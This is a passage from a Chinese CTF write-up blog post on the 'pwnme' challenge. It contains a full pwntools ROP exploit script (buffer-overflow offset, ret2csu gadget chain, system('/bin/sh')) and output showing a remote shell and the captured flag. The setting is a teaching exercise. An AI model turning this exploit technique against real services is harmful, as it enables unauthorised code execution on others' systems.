0x0</div><div class="line">*R11  0x7fffffffdf41 ◂— 0x3269413169413069 (<span class="string">'i0Ai1Ai2'</span>)</div><div class="line">*R12  0x400770 ◂— xor    ebp, ebp</div><div class="line">*R13  0x7fffffffe080 ◂— 0x1</div><div class="line"> R14  0x0</div><div class="line"> R15  0x0</div><div class="line">*RBP  0x4132624131624130 (<span class="string">'0Ab1Ab2A'</span>)</div><div class="line">*RSP  0x7fffffffde78 ◂— 0x3562413462413362 (<span class="string">'b3Ab4Ab5'</span>)</div><div class="line">*RIP  0x400ad0 ◂— ret    </div><div class="line">[────────────────────────────────────DISASM────────────────────────────────────]</div><div class="line"> ► 0x400ad0    ret    &lt;0x3562413462413362&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到在内存地址<code>0x3562413462413362</code>发生了段错误，然后我们用<code>pattent.py</code>寻找位移得知位移为<code>40 Bytes</code><br>(我的gdb装了pwnbdg插件所以会跟一般的gdb显示不同，pwndbg在github上有)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python pattern.py  offset 0x3562413462413362</div><div class="line">hex pattern decoded as: b3Ab4Ab5</div><div class="line">40</div></pre></td></tr></table></figure></p>
<p>然后我们就可以在填充了40个字节的数据之后填上我们的劫持地址了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#exploit</span></div><div class="line"><span class="comment">#修改名字随便</span></div><div class="line">respone(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)</div><div class="line">respone(<span class="string">'please input new username(max lenth:20): \n'</span>,<span class="string">'123'</span>)</div><div class="line"><span class="comment">#找到一个pop几个参数进rsi,rdi,rdx供read使用</span></div><div class="line"><span class="comment">#rbx和rbp是为了call之后代码继续执行会进行一个add rbx, 1;cmp rbx, rbp ;jnz back;</span></div><div class="line"><span class="comment">#所以我们将0 pop 给rbx 将 1 pop 给 rbp 给它继续执行下去</span></div><div class="line"><span class="comment">#0x400eca : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></div><div class="line"><span class="comment">#0x400eb0 : mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12+rbx*8]</span></div><div class="line">pop_6_ret = <span class="number">0x400eca</span></div><div class="line">call_address = <span class="number">0x400eb0</span></div><div class="line">pop_rdi_ret = <span class="number">0x400ed3</span></div><div class="line">read_got = <span class="number">0x601FC8</span><span class="comment">#read之前已经调用，直接读取got就好了</span></div><div class="line"><span class="comment">#.bss</span></div><div class="line">bin_sh_addr = <span class="number">0x602010</span></div><div class="line"><span class="comment">#first ret address is 40 bytes</span></div><div class="line">payload =  <span class="string">'A'</span>*<span class="number">40</span></div><div class="line"><span class="comment">#pop 进寄存器</span></div><div class="line">payload +=  p64(pop_6_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh_addr)+p64(<span class="number">0</span>)<span class="comment">#作用就是劫持控制流到pop_6_ret处执行，然后分别pop 0-&gt;rbx ; pop 1-&gt;rbp ;pop read_got -&gt;r13;pop 8 -&gt;r14  ;pop 1-&gt;r15 ;对应下一个gadget的mov给read三个传参</span></div><div class="line"><span class="comment"># call read</span></div><div class="line"> <span class="comment">#7个0x1对应call之后的7个pop，无关紧要，我们只想要ret，实在不理解可以看IDA</span></div><div class="line">payload += p64(call_address)+p64(<span class="number">0x1</span>)*<span class="number">7</span> </div><div class="line"><span class="comment">#最后起shell</span></div><div class="line">payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</div><div class="line"><span class="comment">#在payload后面填充字符'0'至长度为0x110</span></div><div class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">'0'</span>)</div><div class="line"><span class="comment">#发送padload</span></div><div class="line">respone(<span class="string">'please input new password(max lenth:20): \n'</span>,payload)</div><div class="line">pro.send(<span class="string">'/bin/sh\x00'</span>)<span class="comment">#将字符串'/bin/sh\x00'读入缓冲区</span></div><div class="line">pro.interactive()<span class="comment">#开启交互</span></div></pre></td></tr></table></figure></p>
<p>至此就可以得到shell了<br>运行脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">$ python test.py </div><div class="line">[+] Opening connection to 106.75.66.195 on port 13002: Done</div><div class="line">[*] <span class="string">'/home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[+] Loading from <span class="string">'/home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme'</span>: 0x7f3cefbef150</div><div class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0x7f3cefbef150</div><div class="line">[!] No ELF provided.  Leaking is much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</div><div class="line">[*] No linkmap found</div><div class="line">[*] .gnu.hash/.<span class="built_in">hash</span>, .strtab and .symtab offsets</div><div class="line">[*] Found DT_GNU_HASH at 0x7f3cef9c4be0</div><div class="line">[*] Found DT_STRTAB at 0x7f3cef9c4bf0</div><div class="line">[*] Found DT_SYMTAB at 0x7f3cef9c4c00</div><div class="line">[*] .gnu.hash parms</div><div class="line">[*] <span class="built_in">hash</span> chain index</div><div class="line">[*] <span class="built_in">hash</span> chain</div><div class="line">0x7f3cef64b020</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ id</div><div class="line">uid=1009(pwnme) gid=1009(pwnme) groups=1009(pwnme)</div><div class="line">$ cat /home/pwnme/flag.txt</div><div class="line">flag&#123;ecfdbab646c8539f75078b76216942ef&#125;</div></pre></td></tr></table></figure></p>
<p><strong>总结</strong></p>
<blockquote>
<ol>
<li>耗时很久，需要掌握的东西略多</li>
<li>linux 32和64位差异不了解</li>
<li>二进制工具不熟悉,linux调试短板</li>
<li>劳累、耗时程度与成就感成正比</li>
</ol>
</blockquote>
<p><strong>参考文献</strong>(巨多!!!)</p>
<blockquote>
<p><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="external">[ 一步一步学ROP之linux_x86篇 - 蒸米 ]</a> <a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/tips-6597.html</a><br><a href="http://wps2015.org/drops/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="external">[ 一步一步学ROP之linux_x64篇 - 蒸米 ]</a> <a href="http://wps2015.org/drops/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="external">http://wps2015.org/drops/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/index.html" target="_blank" rel="external">[ CTF Wiki - 格式化字符串漏洞 ]</a> <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/index.html" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/index.html</a><br><a href="http://www.mottoin.com/92467.html" target="_blank" rel="external">[ 百度杯十一月场pwn专题赛—pwnme writeup - Moto ]</a> <a href="http://www.mottoin.com/92467.html" target="_blank" rel="external">http://www.mottoin.com/92467.html</a><br><a href="https://bbs.ichunqiu.com/thread-16508-1-1.html" target="_blank" rel="external">[ 百度杯CTF·十二月PWN专题WriteUp解析 - 一口盐汽水 ]</a> <a href="https://bbs.ichunqiu.com/thread-16508-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-16508-1-1.html</a><br><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="external">[ 借助DynELF实现无libc的漏洞利用小结 - tianyi201612 ]</a><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="external">https://www.anquanke.com/post/id/85129</a><br><a href="http://blog.csdn.net/qq_15514565/article/details/57644132" target="_blank" rel="external">[ IA32寄存器与x86-64寄存器的区别 - 转载 ]</a> <a href="http://blog.csdn.net/qq_15514565/article/details/57644132" target="_blank" rel="external">http://blog.csdn.net/qq_15514565/article/details/57644132</a><br><a href="http://www.mamicode.com/info-detail-1990426.html" target="_blank" rel="external">[ 二进制的保护机制 ]</a> <a href="http://www.mamicode.com/info-detail-1990426.html" target="_blank" rel="external">http://www.mamicode.com/info-detail-1990426.html</a></p>
</blockquote>

      
    </div>
    
    
    
	<div>
	  
		<div>
    
		<br>
		</br>
        <div style="text-align:center;color: #ccc;font-size:14px">----- 感谢阅读 -----<br></br></div>
    
</div>
	  
	</div>
    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/二进制/" rel="tag"># 二进制</a>
          
            <a href="/tags/PWN/" rel="tag"># PWN</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/11/20/2017-LCTF-use_your_IDA/" rel="next" title="2017-LCTF-use_your_IDA解析">
                <i class="fa fa-chevron-left"></i> 2017-LCTF-use_your_IDA解析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/01/16/PythonGUI模拟TCP／IP解、封包/" rel="prev" title="PythonGUI模拟TCP／IP解、封包">
                PythonGUI模拟TCP／IP解、封包 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">W z</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/wananpIG" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="testzero.wz@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Canary（栈保护）"><span class="nav-number">1.</span> <span class="nav-text">Canary（栈保护）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NX-DEP（堆栈不可执行）"><span class="nav-number">2.</span> <span class="nav-text">NX/DEP（堆栈不可执行）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PIE-ASLR（地址随机化）"><span class="nav-number">3.</span> <span class="nav-text">PIE/ASLR（地址随机化）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Fortify"><span class="nav-number">4.</span> <span class="nav-text">Fortify</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RelRO"><span class="nav-number">5.</span> <span class="nav-text">RelRO</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">W z</span>

  
</div>


<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>




  <span class="post-meta-divider">|</span>



<div class="powered-by">
 桂ICP备17008880号
 </div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  

</body>
</html>
